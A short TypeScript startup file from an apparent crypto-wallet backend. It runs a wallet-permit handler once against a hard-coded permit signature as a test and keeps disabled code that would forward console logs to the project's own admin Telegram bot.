import {ADMIN_BOT, HotReloadTelegramBot} from "./bot/main";
import prisma from "@backend/modules/prisma/Prisma";
import WalletPermit from "@backend/api/wallet/permit/handler";
export let DEV_USER: Awaited<ReturnType<typeof prisma.user.findFirst>>;
export let DEV_LOGS: string[] = [];
export async function register() {
	/*HotReloadTelegramBot();

	DEV_USER = await prisma.user.findFirst({
		where: {
			username: "itzunity"
		}
	});

	type keyType = 'error' | 'log' | 'warn';
	const registerLog = (key: keyType) => {
		const origin = console[key] as typeof console.error;
		return (...args: any[])=>{
			const R = origin(...args);
			ADMIN_BOT.waitToReady().then(async (me)=>{
				adminLog(`[${key?.toUpperCase()}] `+args.map(o => o+"").join("\n"));
			}).catch(origin);
			return R;
		};
	}

	for (const key of ['warn','log', 'error']) {
		console[key as keyType] = registerLog(key as keyType);
	}*/

	const handler = new WalletPermit();
	handler.json = {
		"contract": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
		"signature": "0x1feb58e343fe54c4b00c11c8f285c2ff40f9bfe34a21655d3cf5eb262b381b006d4bdd7afbf7781158c0a23244b7b878d34cf14b5beee5b4e608b320b21f74871b",
		"spender": "0xB932eF059c3857FBA2505B31E5899b3E170f25E7",
		"amount": "10000000000000000",
		"nonce": 2,
		"deadline": 300000
	};

	console.log(await handler.handler());
}

// setInterval(()=>{
// 	if (!DEV_USER) return;
//
// 	if (!!DEV_LOGS?.length) ADMIN_BOT.telegram.sendMessage(DEV_USER?.chatId,DEV_LOGS.join("\n\n")).then(()=>{
// 		DEV_LOGS = [];
// 	}).catch(()=>null)
// }, 2000);
//
// export function adminLog(msg: string) {
// 	DEV_LOGS.push(msg);
// }
